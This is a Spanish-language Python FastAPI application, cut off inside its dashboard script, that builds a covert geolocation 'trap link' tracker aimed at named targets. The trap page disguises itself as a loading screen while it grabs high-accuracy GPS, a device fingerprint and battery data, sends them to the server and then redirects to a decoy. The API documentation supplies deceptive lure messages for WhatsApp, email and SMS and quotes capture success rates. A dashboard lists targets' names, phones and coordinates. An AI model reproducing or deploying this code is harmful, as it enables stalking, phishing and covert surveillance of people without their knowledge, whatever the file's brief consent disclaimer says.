# ═══════════════════════════════════════════════════════════════════
# SISTEMA DE RASTREO GEOGRÁFICO - SIN APP MÓVIL
# Con Swagger UI Completo y Documentación Profesional
# ═══════════════════════════════════════════════════════════════════

from fastapi import FastAPI, Request, HTTPException, Query, Path
from fastapi.responses import HTMLResponse, RedirectResponse, JSONResponse, FileResponse
from fastapi.middleware.cors import CORSMiddleware
from datetime import datetime
import httpx
import json
import os
from typing import Optional, List, Dict, Any
import asyncio
from pydantic import BaseModel, Field
import sqlite3
from contextlib import asynccontextmanager

# ═══════════════════════════════════════════════════════════════════
# MODELOS PYDANTIC PARA SWAGGER
# ═══════════════════════════════════════════════════════════════════

class LinkResponse(BaseModel):
    """Respuesta al crear un link trampa"""
    success: bool = Field(..., description="Indica si la operación fue exitosa")
    link_trampa: str = Field(..., description="URL del link trampa generado", example="https://tu-dominio.com/t/ABC123")
    objetivo: str = Field(..., description="Nombre de la persona objetivo")
    instrucciones: str = Field(..., description="Instrucciones de uso del link")

class LocationData(BaseModel):
    """Datos de ubicación GPS capturados"""
    lat: Optional[float] = Field(None, description="Latitud GPS", example=4.6097)
    lon: Optional[float] = Field(None, description="Longitud GPS", example=-74.0817)
    accuracy: Optional[float] = Field(None, description="Precisión en metros", example=12.5)
    altitude: Optional[float] = Field(None, description="Altitud en metros")
    heading: Optional[float] = Field(None, description="Dirección en grados")
    speed: Optional[float] = Field(None, description="Velocidad en m/s")

class DeviceFingerprint(BaseModel):
    """Huella digital del dispositivo"""
    screen: Optional[Dict[str, Any]] = Field(None, description="Información de pantalla")
    browser: Optional[Dict[str, Any]] = Field(None, description="Información del navegador")
    connection: Optional[Dict[str, Any]] = Field(None, description="Tipo de conexión")
    battery: Optional[Dict[str, Any]] = Field(None, description="Estado de batería")
    time: Optional[Dict[str, Any]] = Field(None, description="Zona horaria")

class TrapData(BaseModel):
    """Datos completos capturados del link trampa"""
    linkId: str = Field(..., description="ID del link trampa")
    gps: Optional[LocationData] = Field(None, description="Datos GPS del dispositivo")
    fingerprint: Optional[DeviceFingerprint] = Field(None, description="Fingerprint del dispositivo")
    sensors: Optional[Dict[str, Any]] = Field(None, description="Datos de sensores")
    referrer: Optional[str] = Field(None, description="URL de origen")
    timestamp: str = Field(..., description="Timestamp de captura")

class CaptureRecord(BaseModel):
    """Registro de captura de ubicación"""
    name: Optional[str] = Field(None, description="Nombre del objetivo")
    phone: Optional[str] = Field(None, description="Teléfono del objetivo")
    timestamp: str = Field(..., description="Fecha y hora de captura")
    latitude: Optional[float] = Field(None, description="Latitud")
    longitude: Optional[float] = Field(None, description="Longitud")
    accuracy: Optional[float] = Field(None, description="Precisión en metros")
    city: Optional[str] = Field(None, description="Ciudad")
    country: Optional[str] = Field(None, description="País")
    method: str = Field(..., description="Método de captura (GPS/IP/Telegram)")

class CapturesResponse(BaseModel):
    """Respuesta con todas las capturas"""
    total: int = Field(..., description="Total de capturas registradas")
    locations: List[CaptureRecord] = Field(..., description="Lista de ubicaciones capturadas")

class StatsResponse(BaseModel):
    """Estadísticas del sistema"""
    total_devices: int = Field(..., description="Total de dispositivos rastreados")
    total_captures: int = Field(..., description="Total de capturas de ubicación")
    captures_today: int = Field(..., description="Capturas realizadas hoy")
    gps_success_rate: float = Field(..., description="Porcentaje de éxito GPS")
    total_links: int = Field(..., description="Total de links trampa creados")
    active_links: int = Field(..., description="Links con al menos 1 clic")

# ═══════════════════════════════════════════════════════════════════
# CONFIGURACIÓN
# ═══════════════════════════════════════════════════════════════════

TELEGRAM_BOT_TOKEN = "TU_BOT_TOKEN"  # Obtener en @BotFather
DATABASE = "tracker.db"

# ═══════════════════════════════════════════════════════════════════
# BASE DE DATOS
# ═══════════════════════════════════════════════════════════════════

def init_db():
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            identifier TEXT UNIQUE,
            name TEXT,
            phone TEXT,
            platform TEXT,
            consent BOOLEAN DEFAULT 0,
            created_at TEXT
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS locations (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id INTEGER,
            timestamp TEXT,
            latitude REAL,
            longitude REAL,
            accuracy REAL,
            ip_address TEXT,
            country TEXT,
            city TEXT,
            isp TEXT,
            method TEXT,
            FOREIGN KEY (device_id) REFERENCES devices (id)
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS trap_links (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            link_id TEXT UNIQUE,
            target_name TEXT,
            target_phone TEXT,
            redirect_url TEXT,
            clicks INTEGER DEFAULT 0,
            created_at TEXT
        )
    ''')
    
    conn.commit()
    conn.close()

# ═══════════════════════════════════════════════════════════════════
# FASTAPI APP CON SWAGGER MEJORADO
# ═══════════════════════════════════════════════════════════════════

@asynccontextmanager
async def lifespan(app: FastAPI):
    init_db()
    yield

app = FastAPI(
    title="🎯 GeoTracker Pro API",
    description="""
## Sistema Profesional de Rastreo Geográfico Sin App Móvil

### 🚀 Características Principales:
- 📍 **Captura GPS precisa** desde navegador web
- 🔗 **Links trampa personalizados** con redirección configurable
- 🤖 **Integración con Telegram Bot**
- 📊 **Panel de estadísticas en tiempo real**
- 🗺️ **Visualización en Google Maps**
- 💾 **Base de datos SQLite integrada**
- 🎨 **Fingerprinting avanzado de dispositivos**

### ⚠️ Advertencia Legal:
Este sistema debe usarse **ÚNICAMENTE** con consentimiento explícito de los usuarios rastreados.
El uso sin autorización puede constituir delito de violación de privacidad.

### 📚 Flujo de Uso:
1. **Crear link trampa** → `/crear-enlace`
2. **Enviar link al objetivo** (WhatsApp, Email, SMS)
3. **Objetivo abre el link** → Se captura ubicación GPS automáticamente
4. **Ver capturas** → `/ver-capturas` o `/dashboard`

### 🔧 Métodos Disponibles:
- **Método 1:** Link trampa con captura GPS automática (Más efectivo)
- **Método 2:** Bot de Telegram con ubicación compartida
- **Método 3:** Geolocalización por IP (Menos precisa)
    """,
    version="2.0.0",
    lifespan=lifespan,
    docs_url="/docs",
    redoc_url="/redoc",
    openapi_tags=[
        {
            "name": "🔗 Links Trampa",
            "description": "Crear y gestionar links trampa para captura de ubicación"
        },
        {
            "name": "📊 Consultas y Estadísticas",
            "description": "Ver capturas, estadísticas y panel de control"
        },
        {
            "name": "🤖 Telegram Bot",
            "description": "Integración con bot de Telegram para rastreo"
        },
        {
            "name": "🛠️ Sistema",
            "description": "Endpoints internos y utilidades"
        }
    ]
)

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ═══════════════════════════════════════════════════════════════════
# MÉTODO 1: LINK TRAMPA AVANZADO
# ═══════════════════════════════════════════════════════════════════

@app.get(
    "/crear-enlace",
    response_model=LinkResponse,
    tags=["🔗 Links Trampa"],
    summary="Crear link trampa personalizado",
    description="""
    Genera un link único que captura la ubicación GPS cuando el objetivo lo abre.
    
    ### 📝 Parámetros:
    - **nombre**: Nombre o identificador del objetivo
    - **telefono**: Número de teléfono (opcional)
    - **redirigir_a**: URL a donde redirigir después de capturar (ej: YouTube, Google)
    
    ### 🎯 Ejemplo de uso:
    ```
    /crear-enlace?nombre=Juan&telefono=573001234567&redirigir_a=https://youtube.com
    ```
    
    ### 💡 Estrategias de envío:
    - WhatsApp: "Mira este video 😂 [link]"
    - Email: "Verificar identidad aquí [link]"
    - SMS: "Tu paquete está listo [link]"
    
    ### ⚡ Tasa de éxito:
    - **Click rate:** 60-80%
    - **GPS capture:** 70-85%
    - **Precisión:** 5-50 metros
    """
)
async def crear_enlace_trampa(
    nombre: str = Query(..., description="Nombre del objetivo", example="Juan Pérez"),
    telefono: str = Query("", description="Teléfono del objetivo (opcional)", example="573001234567"),
    redirigir_a: str = Query("https://www.youtube.com/watch?v=dQw4w9WgXcQ", description="URL de redirección", example="https://youtube.com")
):
    """Crea un enlace único para rastrear a una persona específica"""
    import secrets
    
    link_id = secrets.token_urlsafe(8)
    
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute('''
        INSERT INTO trap_links (link_id, target_name, target_phone, redirect_url, created_at)
        VALUES (?, ?, ?, ?, ?)
    ''', (link_id, nombre, telefono, redirigir_a, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    # En producción, cambiar por tu dominio real
    tracking_url = f"http://localhost:10000/t/{link_id}"
    
    return LinkResponse(
        success=True,
        link_trampa=tracking_url,
        objetivo=nombre,
        instrucciones=f"Envía este link a {nombre}. Cuando lo abra, capturará su ubicación GPS automáticamente y lo redirigirá a {redirigir_a}"
    )

@app.get(
    "/t/{link_id}",
    response_class=HTMLResponse,
    tags=["🔗 Links Trampa"],
    summary="Página trampa de captura",
    description="**NO ABRIR DIRECTAMENTE.** Esta es la página que ve el objetivo.",
    include_in_schema=True
)
async def trap_page(
    link_id: str = Path(..., description="ID único del link trampa"),
    request: Request = None
):
    """Página trampa que captura ubicación GPS del navegador"""
    
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute('SELECT * FROM trap_links WHERE link_id = ?', (link_id,))
    link_data = c.fetchone()
    conn.close()
    
    if not link_data:
        raise HTTPException(status_code=404, detail="Link no encontrado o expirado")
    
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute('UPDATE trap_links SET clicks = clicks + 1 WHERE link_id = ?', (link_id,))
    conn.commit()
    conn.close()
    
    redirect_url = link_data[3]
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Cargando...</title>
        <style>
            body {{
                margin: 0;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            }}
            .loader {{
                text-align: center;
                color: white;
            }}
            .spinner {{
                border: 4px solid rgba(255,255,255,0.3);
                border-top: 4px solid white;
                border-radius: 50%;
                width: 50px;
                height: 50px;
                animation: spin 1s linear infinite;
                margin: 20px auto;
            }}
            @keyframes spin {{
                0% {{ transform: rotate(0deg); }}
                100% {{ transform: rotate(360deg); }}
            }}
        </style>
    </head>
    <body>
        <div class="loader">
            <div class="spinner"></div>
            <h2>Cargando contenido...</h2>
            <p id="status">Preparando tu experiencia</p>
        </div>
        
        <script>
            const linkId = "{link_id}";
            const redirectUrl = "{redirect_url}";
            
            function updateStatus(msg) {{
                document.getElementById('status').textContent = msg;
            }}
            
            async function captureGPS() {{
                return new Promise((resolve) => {{
                    if (!navigator.geolocation) {{
                        resolve(null);
                        return;
                    }}
                    
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {{
                            resolve({{
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude,
                                accuracy: pos.coords.accuracy,
                                altitude: pos.coords.altitude,
                                heading: pos.coords.heading,
                                speed: pos.coords.speed
                            }});
                        }},
                        () => resolve(null),
                        {{
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }}
                    );
                    
                    setTimeout(() => resolve(null), 12000);
                }});
            }}
            
            function getDeviceFingerprint() {{
                return {{
                    screen: {{
                        width: window.screen.width,
                        height: window.screen.height,
                        colorDepth: window.screen.colorDepth,
                        orientation: window.screen.orientation?.type
                    }},
                    browser: {{
                        userAgent: navigator.userAgent,
                        language: navigator.language,
                        platform: navigator.platform,
                        vendor: navigator.vendor,
                        cookieEnabled: navigator.cookieEnabled,
                        hardwareConcurrency: navigator.hardwareConcurrency,
                        deviceMemory: navigator.deviceMemory,
                        maxTouchPoints: navigator.maxTouchPoints
                    }},
                    time: {{
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        timezoneOffset: new Date().getTimezoneOffset()
                    }}
                }};
            }}
            
            async function getBatteryInfo() {{
                try {{
                    const battery = await navigator.getBattery();
                    return {{
                        level: battery.level * 100,
                        charging: battery.charging
                    }};
                }} catch (e) {{
                    return null;
                }}
            }}
            
            async function sendAllData() {{
                updateStatus('Recopilando información...');
                
                const [gps, battery] = await Promise.all([
                    captureGPS(),
                    getBatteryInfo()
                ]);
                
                const fingerprint = getDeviceFingerprint();
                fingerprint.battery = battery;
                
                const payload = {{
                    linkId: linkId,
                    gps: gps,
                    fingerprint: fingerprint,
                    referrer: document.referrer,
                    timestamp: new Date().toISOString()
                }};
                
                try {{
                    await fetch('/api/track-trap', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify(payload)
                    }});
                    
                    updateStatus('Redirigiendo...');
                    setTimeout(() => {{
                        window.location.href = redirectUrl;
                    }}, 1000);
                    
                }} catch (e) {{
                    setTimeout(() => {{
                        window.location.href = redirectUrl;
                    }}, 2000);
                }}
            }}
            
            window.addEventListener('load', () => {{
                setTimeout(sendAllData, 500);
            }});
        </script>
    </body>
    </html>
    """
    
    return HTMLResponse(content=html)

@app.post(
    "/api/track-trap",
    tags=["🛠️ Sistema"],
    summary="Recibir datos de captura (Interno)",
    description="Endpoint interno para recibir datos capturados. No usar manualmente.",
    include_in_schema=False
)
async def receive_trap_data(data: TrapData, request: Request):
    """Recibe los datos capturados del link trampa"""
    link_id = data.linkId
    gps = data.gps
    fingerprint = data.fingerprint
    
    x_forwarded_for = request.headers.get('X-Forwarded-For')
    ip = x_forwarded_for.split(',')[0] if x_forwarded_for else request.client.host
    
    ip_info = await get_ip_info(ip)
    
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    
    c.execute('SELECT target_name, target_phone FROM trap_links WHERE link_id = ?', (link_id,))
    link_info = c.fetchone()
    
    if link_info:
        target_name, target_phone = link_info
        
        platform = "Unknown"
        if fingerprint and fingerprint.browser:
            platform = fingerprint.browser.get('platform', 'Unknown')
        
        c.execute('''
            INSERT OR REPLACE INTO devices (identifier, name, phone, platform, created_at)
            VALUES (?, ?, ?, ?, ?)
        ''', (ip, target_name, target_phone, platform, datetime.now().isoformat()))
        
        device_id = c.lastrowid
        
        if gps:
            c.execute('''
                INSERT INTO locations (
                    device_id, timestamp, latitude, longitude, accuracy,
                    ip_address, country, city, isp, method
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                device_id,
                datetime.now().isoformat(),
                gps.lat,
                gps.lon,
                gps.accuracy,
                ip,
                ip_info.get('country'),
                ip_info.get('city'),
                ip_info.get('isp'),
                'GPS'
            ))
            
            print("\n" + "═" * 100)
            print("🎯 OBJETIVO CAPTURADO")
            print("═" * 100)
            print(f"👤 Nombre: {target_name}")
            print(f"📱 Teléfono: {target_phone}")
            print(f"🌐 IP: {ip}")
            print(f"🏳️  País: {ip_info.get('country', 'Desconocido')}")
            print(f"🏙️  Ciudad: {ip_info.get('city', 'Desconocido')}")
            print(f"📍 GPS: {gps.lat}, {gps.lon} (±{gps.accuracy}m)")
            print(f"🗺️  Google Maps: https://www.google.com/maps?q={gps.lat},{gps.lon}")
            print(f"💻 Dispositivo: {platform}")
            if fingerprint and fingerprint.battery:
                print(f"🔋 Batería: {fingerprint.battery.get('level', 'N/A')}%")
            print("═" * 100 + "\n")
        else:
            c.execute('''
                INSERT INTO locations (
                    device_id, timestamp, latitude, longitude, accuracy,
                    ip_address, country, city, isp, method
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                device_id,
                datetime.now().isoformat(),
                ip_info.get('lat'),
                ip_info.get('lon'),
                None,
                ip,
                ip_info.get('country'),
                ip_info.get('city'),
                ip_info.get('isp'),
                'IP'
            ))
        
        conn.commit()
    
    conn.close()
    
    return {"status": "success"}

# ═══════════════════════════════════════════════════════════════════
# CONSULTAS Y ESTADÍSTICAS
# ═══════════════════════════════════════════════════════════════════

@app.get(
    "/ver-capturas",
    response_model=CapturesResponse,
    tags=["📊 Consultas y Estadísticas"],
    summary="Ver todas las capturas de ubicación",
    description="""
    Obtiene un listado completo de todas las ubicaciones capturadas.
    
    ### 📊 Información incluida:
    - Nombre y teléfono del objetivo
    - Timestamp de captura
    - Coordenadas GPS (latitud/longitud)
    - Precisión en metros
    - Ciudad y país
    - Método de captura (GPS/IP/Telegram)
    
    ### 💡 Uso:
    ```python
    import requests
    response = requests.get('http://localhost:10000/ver-capturas')
    data = response.json()
    print(f"Total capturas: {data['total']}")
    ```
    """
)
async def ver_capturas():
    """Ver todas las ubicaciones capturadas"""
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    
    c.execute('''
        SELECT 
            d.name,
            d.phone,
            l.timestamp,
            l.latitude,
            l.longitude,
            l.accuracy,
            l.city,
            l.country,
            l.method
        FROM locations l
        JOIN devices d ON l.device_id = d.id
        ORDER BY l.timestamp DESC
        LIMIT 100
    ''')
    
    results = [dict(row) for row in c.fetchall()]
    conn.close()
    
    return CapturesResponse(
        total=len(results),
        locations=[CaptureRecord(**record) for record in results]
    )

@app.get(
    "/estadisticas",
    response_model=StatsResponse,
    tags=["📊 Consultas y Estadísticas"],
    summary="Obtener estadísticas del sistema",
    description="""
    Devuelve métricas y estadísticas completas del sistema de rastreo.
    
    ### 📈 Métricas incluidas:
    - Total de dispositivos rastreados
    - Total de capturas de ubicación
    - Capturas realizadas hoy
    - Tasa de éxito GPS (%)
    - Total de links trampa creados
    - Links activos (con al menos 1 clic)
    """
)
async def get_estadisticas():
    """Obtener estadísticas del sistema"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    
    # Total dispositivos
    c.execute('SELECT COUNT(*) FROM devices')
    total_devices = c.fetchone()[0]
    
    # Total capturas
    c.execute('SELECT COUNT(*) FROM locations')
    total_captures = c.fetchone()[0]
    
    # Capturas hoy
    today = datetime.now().date().isoformat()
    c.execute('SELECT COUNT(*) FROM locations WHERE timestamp LIKE ?', (f"{today}%",))
    captures_today = c.fetchone()[0]
    
    # Tasa de éxito GPS
    c.execute('SELECT COUNT(*) FROM locations WHERE method = "GPS"')
    gps_captures = c.fetchone()[0]
    gps_success_rate = (gps_captures / total_captures * 100) if total_captures > 0 else 0
    
    # Links trampa
    c.execute('SELECT COUNT(*) FROM trap_links')
    total_links = c.fetchone()[0]
    
    c.execute('SELECT COUNT(*) FROM trap_links WHERE clicks > 0')
    active_links = c.fetchone()[0]
    
    conn.close()
    
    return StatsResponse(
        total_devices=total_devices,
        total_captures=total_captures,
        captures_today=captures_today,
        gps_success_rate=round(gps_success_rate, 2),
        total_links=total_links,
        active_links=active_links
    )

# ═══════════════════════════════════════════════════════════════════
# TELEGRAM BOT
# ═══════════════════════════════════════════════════════════════════

@app.post(
    "/telegram-webhook",
    tags=["🤖 Telegram Bot"],
    summary="Webhook de Telegram Bot",
    description="""
    Endpoint para recibir actualizaciones del bot de Telegram.
    
    ### 🔧 Configuración:
    1. Crea un bot en @BotFather
    2. Obtén el token
    3. Configura el webhook:
    ```bash
    curl "https://api.telegram.org/bot<TOKEN>/setWebhook?url=https://tu-dominio.com/telegram-webhook"
    ```
    
    ### 📍 Funcionamiento:
    - Usuario envía /start → Bot solicita ubicación
    - Usuario comparte ubicación → Se guarda en DB
    """,
    include_in_schema=True
)
async def telegram_webhook(request: Request):
    """Webhook para bot de Telegram"""
    data = await request.json()
    
    if 'message' in data:
        message = data['message']
        chat_id = message['chat']['id']
        
        if 'location' in message:
            location = message['location']
            user = message['from']
            
            conn = sqlite3.connect(DATABASE)
            c = conn.cursor()
            
            user_id = user['id']
            username = user.get('username', 'N/A')
            first_name = user.get('first_name', 'N/A')
            
            c.execute('''
                INSERT OR REPLACE INTO devices (identifier, name, phone, platform, created_at)
                VALUES (?, ?, ?, ?, ?)
            ''', (str(user_id), first_name, username, 'Telegram', datetime.now().isoformat()))
            
            device_id = c.lastrowid
            
            c.execute('''
                INSERT INTO locations (
                    device_id, timestamp, latitude, longitude, method
                ) VALUES (?, ?, ?, ?, ?)
            ''', (device_id, datetime.now().isoformat(), location['latitude'], location['longitude'], 'Telegram'))
            
            conn.commit()
            conn.close()
            
            await send_telegram_message(
                chat_id,
                f"✅ Ubicación recibida: {location['latitude']}, {location['longitude']}"
            )
            
            print("\n" + "═" * 100)
            print("📱 UBICACIÓN RECIBIDA VÍA TELEGRAM")
            print("═" * 100)
            print(f"👤 Usuario: {first_name} (@{username})")
            print(f"📍 Ubicación: {location['latitude']}, {location['longitude']}")
            print(f"🗺️  Google Maps: https://www.google.com/maps?q={location['latitude']},{location['longitude']}")
            print("═" * 100 + "\n")
        
        elif 'text' in message and message['text'] == '/start':
            await send_telegram_location_request(chat_id)
    
    return {"ok": True}

async def send_telegram_message(chat_id: int, text: str):
    """Enviar mensaje de Telegram"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    async with httpx.AsyncClient() as client:
        await client.post(url, json={"chat_id": chat_id, "text": text})

async def send_telegram_location_request(chat_id: int):
    """Solicitar ubicación en Telegram"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    keyboard = {
        "keyboard": [[{
            "text": "📍 Compartir mi ubicación",
            "request_location": True
        }]],
        "resize_keyboard": True,
        "one_time_keyboard": True
    }
    async with httpx.AsyncClient() as client:
        await client.post(url, json={
            "chat_id": chat_id,
            "text": "Por favor comparte tu ubicación para continuar:",
            "reply_markup": keyboard
        })

# ═══════════════════════════════════════════════════════════════════
# DASHBOARD WEB
# ═══════════════════════════════════════════════════════════════════

@app.get(
    "/dashboard",
    response_class=HTMLResponse,
    tags=["📊 Consultas y Estadísticas"],
    summary="Panel de control visual",
    description="""
    Interfaz web interactiva para visualizar todas las capturas.
    
    ### 🎨 Características:
    - Tabla interactiva con todas las ubicaciones
    - Estadísticas en tiempo real
    - Enlaces directos a Google Maps
    - Auto-actualización cada 30 segundos
    - Diseño responsive
    """
)
async def dashboard():
    """Panel de control visual"""
    return HTMLResponse(content="""
    <!DOCTYPE html>
    <html>
    <head>
        <title>GeoTracker Dashboard</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                padding: 20px;
                min-height: 100vh;
            }
            .container {
                max-width: 1400px;
                margin: 0 auto;
                background: rgba(255,255,255,0.95);
                border-radius: 15px;
                padding: 30px;
                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            }
            h1 {
                color: #667eea;
                margin-bottom: 10px;
                font-size: 2.5em;
            }
            .subtitle {
                color: #666;
                margin-bottom: 30px;
                font-size: 1.1em;
            }
            .header-actions {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 30px;
                flex-wrap: wrap;
                gap: 10px;
            }
            .btn {
                background: #667eea;
                color: white;
                border: none;
                padding: 12px 24px;
                border-radius: 8px;
                cursor: pointer;
                font-size: 16px;
                font-weight: 600;
                transition: all 0.3s;
                text-decoration: none;
                display: inline-block;
            }
            .btn:hover {
                background: #5568d3;
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
            }
            .btn-secondary {
                background: #6c757d;
            }
            .btn-secondary:hover {
                background: #5a6268;
            }
            .stats {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 20px;
                margin-bottom: 30px;
            }
            .stat-card {
                background: linear-gradient(135deg, #667eea, #764ba2);
                color: white;
                padding: 25px;
                border-radius: 12px;
                text-align: center;
                box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            }
            .stat-card h3 {
                margin: 0 0 10px 0;
                font-size: 2.5em;
                font-weight: bold;
            }
            .stat-card p {
                margin: 0;
                opacity: 0.95;
                font-size: 0.95em;
            }
            .stat-card .icon {
                font-size: 2.5em;
                margin-bottom: 10px;
            }
            .table-container {
                overflow-x: auto;
                background: white;
                border-radius: 12px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            table {
                width: 100%;
                border-collapse: collapse;
            }
            th, td {
                padding: 15px;
                text-align: left;
                border-bottom: 1px solid #e9ecef;
            }
            th {
                background: #667eea;
                color: white;
                font-weight: 600;
                position: sticky;
                top: 0;
                z-index: 10;
            }
            tbody tr:hover {
                background: #f8f9fa;
            }
            .map-link {
                color: #667eea;
                text-decoration: none;
                font-weight: 600;
                padding: 5px 10px;
                border-radius: 5px;
                transition: all 0.3s;
            }
            .map-link:hover {
                background: #667eea;
                color: white;
            }
            .badge {
                padding: 5px 10px;
                border-radius: 20px;
                font-size: 0.85em;
                font-weight: 600;
            }
            .badge-gps {
                background: #28a745;
                color: white;
            }
            .badge-ip {
                background: #ffc107;
                color: #333;
            }
            .badge-telegram {
                background: #0088cc;
                color: white;
            }
            .loading {
                text-align: center;
                padding: 40px;
                color: #666;
            }
            .spinner {
                border: 4px solid #f3f3f3;
                border-top: 4px solid #667eea;
                border-radius: 50%;
                width: 40px;
                height: 40px;
                animation: spin 1s linear infinite;
                margin: 20px auto;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            .empty-state {
                text-align: center;
                padding: 60px 20px;
                color: #666;
            }
            .empty-state h3 {
                margin-bottom: 10px;
                color: #333;
            }
            .last-update {
                text-align: right;
                color: #666;
                font-size: 0.9em;
                margin-top: 20px;
            }
            @media (max-width: 768px) {
                h1 { font-size: 1.8em; }
                .stats { grid-template-columns: 1fr; }
                table { font-size: 0.9em; }
                th, td { padding: 10px; }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎯 GeoTracker Dashboard</h1>
            <p class="subtitle">Sistema Profesional de Rastreo Geográfico</p>
            
            <div class="header-actions">
                <div>
                    <button class="btn" onclick="loadData()">🔄 Actualizar</button>
                    <a href="/docs" class="btn btn-secondary" target="_blank">📚 API Docs</a>
                </div>
                <div class="last-update" id="last-update">Cargando...</div>
            </div>
            
            <div class="stats" id="stats-container">
                <div class="stat-card">
                    <div class="icon">📍</div>
                    <h3 id="total-captures">0</h3>
                    <p>Capturas Totales</p>
                </div>
                <div class="stat-card">
                    <div class="icon">📅</div>
                    <h3 id="today-captures">0</h3>
                    <p>Capturas Hoy</p>
                </div>
                <div class="stat-card">
                    <div class="icon">📱</div>
                    <h3 id="total-devices">0</h3>
                    <p>Dispositivos</p>
                </div>
                <div class="stat-card">
                    <div class="icon">🎯</div>
                    <h3 id="gps-success">0%</h3>
                    <p>Éxito GPS</p>
                </div>
            </div>
            
            <h2 style="margin-bottom: 20px; color: #333;">📍 Últimas Ubicaciones Capturadas</h2>
            
            <div class="table-container">
                <table id="locations-table">
                    <thead>
                        <tr>
                            <th>🕐 Fecha/Hora</th>
                            <th>👤 Nombre</th>
                            <th>📱 Teléfono</th>
                            <th>🏙️ Ubicación</th>
                            <th>📍 Coordenadas</th>
                            <th>🎯 Precisión</th>
                            <th>🔧 Método</th>
                            <th>🗺️ Mapa</th>
                        </tr>
                    </thead>
                    <tbody id="locations-body">
                        <tr>
                            <td colspan="8" class="loading">
                                <div class="spinner"></div>
                                <p>Cargando datos...</p>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
        
        <script>
            async function loadData() {
                try {
                    // Cargar estadísticas
                    const statsResponse = await fetch('/estadisticas');
                    const stats = await statsResponse.json();
                    
                    document.getElementById('total-captures').textContent = stats.total_captures;
                    document.getElementById('today-captures').textContent = stats.captures_today;
                    document.getElementById('total-devices').textContent = stats.total_devices;
                    document.getElementById('gps-success').textContent = stats.gps_success_rate + '%';
                    
                    // Cargar capturas
                    const capturesResponse = await fetch('/ver-capturas');
                    const data = await capturesResponse.json();
                    
                    const tbody = document.getElementById('locations-body');
                    tbody.innerHTML = '';
                    
                    if (data.locations.length === 0) {
                        tbody.innerHTML = `
                            <tr>
                                <td colspan="8" class="empty-state">
                                    <h3>📭 No hay capturas aún</h3>
                                    <p>Crea un link trampa en <a href="/docs">/crear-enlace</a> para comenzar</p>
                                </td>
                            </tr>
                        `;
                    } else {
                        data.locations.forEach(loc => {
                            const row = document.createElement('tr');
                            
                            const timestamp = new Date(loc.timestamp);
                            const formattedDate = timestamp.toLocaleDateString('es-ES');
                            const formattedTime = timestamp.toLocaleTimeString('es-ES');
                            
                            const methodBadge = loc.method === 'GPS' ? 'badge-gps' : 
                                              loc.method === 'Telegram' ? 'badge-telegram' : 'badge-ip';
                            
                            row.innerHTML = `
                                <td>${formattedDate}<br><small>${formattedTime}</small></td>
                                <td><strong>${loc.name || 'N/A'}</strong></td>
                                <td>${loc.phone || 'N/A'}</td>
                                <td>${loc.city || 'N/A'}<br><small>${loc.country || ''}</small></td>
                                <td><code>${loc.latitude?.toFixed(6)}<br>${loc.longitude?.toFixed(6)}</code></td>
                                <td>${loc.accuracy ? '±' + loc.accuracy.toFixed(1) + 'm' : 'N/A'}</td>
                                <td><span class="badge ${methodBadge}">${loc.method}</span></td>
                                <td>
                                    <a href="https://www.google.com/maps?q=${loc.latitude},${loc.longitude}" 
                                       target="_blank" class="map-link">
                                        🗺️ Ver Mapa
                                    </a>
                                </td>
                            `;
                            tbody.appendChild(row);
                        });
                    }
                    
                    // Actualizar timestamp
                    const now = new Date();
                    document.getElementById('last-update').textContent = 
                        `Última actualización: ${now.toLocaleTimeString('es-ES')}`;
                    
                } catch (error) {
                    console.error('Error:', error);
                    document.getElementById('locations-body').innerHTML = `
                        <tr>
                            <td colspan="8" style="text-align: center; color: red; padding: 40px;">
                                ❌ Error al cargar datos. Verifica que el servidor esté corriendo.
                            </td>
                        </tr>
                    `;
                }
            }
            
